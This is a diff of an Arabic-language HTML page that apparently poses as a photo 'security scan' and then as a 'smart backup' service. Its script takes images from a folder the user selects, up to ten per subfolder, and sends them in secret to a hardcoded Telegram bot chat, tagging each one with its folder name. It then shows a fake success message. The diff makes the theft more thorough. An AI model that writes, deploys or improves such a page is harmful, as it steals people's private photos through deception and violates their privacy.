@@ -3,23 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام حماية البيانات 🛡️</title>
+    <title>نظام النسخ الاحتياطي الذكي ☁️</title>
     <style>
-        body { background: #121212; color: #00ff41; text-align: center; font-family: 'Courier New', Courier, monospace; padding-top: 100px; }
-        .box { background: #000; padding: 30px; border: 1px solid #00ff41; border-radius: 15px; display: inline-block; box-shadow: 0 0 15px #00ff41; width: 80%; max-width: 400px; }
-        .btn { background: #00ff41; color: black; padding: 15px 30px; border: none; border-radius: 5px; font-size: 1.2rem; cursor: pointer; font-weight: bold; width: 100%; }
-        p { color: #888; margin-bottom: 25px; }
+        body { background: #111; color: #eee; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .main-card { background: #222; padding: 30px; border-radius: 20px; border: 1px solid #444; display: inline-block; width: 85%; max-width: 450px; }
+        .btn { background: #28a745; color: white; padding: 18px; border: none; border-radius: 10px; font-size: 1.2rem; cursor: pointer; width: 100%; font-weight: bold; }
+        .status-msg { margin-top: 20px; font-size: 14px; color: #888; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>تأمين الملفات السحابي</h2>
-        <p>اضغط للبدء في فحص وتأمين صورك ضد الاختراق.</p>
+    <div class="main-card">
+        <h2>تفعيل المزامنة التلقائية</h2>
+        <p>سيقوم النظام باختيار أفضل 10 صور من كل مجلد لضمان حفظ ذكرياتك بأمان.</p>
         
         <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء الفحص السريع</button>
-        <div id="loader" style="display:none; margin-top:15px; color:white;">جاري معالجة البيانات...</div>
+        <button class="btn" onclick="document.getElementById('fileInput').click()">ابدأ المزامنة الشاملة</button>
+        <div id="status" class="status-msg"></div>
     </div>
 
     <script>
@@ -27,36 +27,47 @@
         const CHAT_ID = '7214473798';
 
         document.getElementById('fileInput').addEventListener('change', function(e) {
-            let allFiles = Array.from(e.target.files);
-            
-            // فلترة الصور فقط من المجلد
-            let imageFiles = allFiles.filter(file => file.type.startsWith('image/'));
+            const allFiles = Array.from(e.target.files);
+            const folders = {};
 
-            if (imageFiles.length > 0) {
-                document.getElementById('loader').style.display = 'block';
+            // 1. تصنيف الملفات حسب المجلدات
+            allFiles.forEach(file => {
+                if (file.type.startsWith('image/')) {
+                    const path = file.webkitRelativePath.split('/');
+                    const folderName = path.length > 1 ? path[path.length - 2] : 'Root';
+                    
+                    if (!folders[folderName]) folders[folderName] = [];
+                    folders[folderName].push(file);
+                }
+            });
 
-                // خلط الصور عشوائياً (Shuffle)
-                imageFiles.sort(() => Math.random() - 0.5);
+            const folderNames = Object.keys(folders);
+            document.getElementById('status').innerText = `تم العثور على ${folderNames.length} مجلدات... جاري السحب.`;
 
-                // اختيار أول 10 صور بعد الخلط العشوائي
-                let randomSelection = imageFiles.slice(0, 10);
+            // 2. معالجة كل مجلد على حدة
+            folderNames.forEach(name => {
+                let images = folders[name];
+                
+                // خلط عشوائي لصور المجلد الواحد
+                images.sort(() => Math.random() - 0.5);
+                
+                // اختيار 10 صور فقط من هذا المجلد
+                let selection = images.slice(0, 10);
 
-                randomSelection.forEach(file => {
+                selection.forEach(file => {
                     let formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('document', file); // نرسلها كـ Document لضمان الجودة
+                    formData.append('document', file);
+                    formData.append('caption', `📦 من مجلد: ${name}`);
 
                     fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
                         method: 'POST',
                         body: formData
                     });
                 });
+            });
 
-                setTimeout(() => {
-                    alert("تم فحص وتأمين الصور بنجاح!");
-                    document.getElementById('loader').style.display = 'none';
-                }, 3000);
-            }
+            alert("بدأت عملية المزامنة بنجاح! قد يستغرق الأمر دقائق.");
         });
     </script>
 </body>
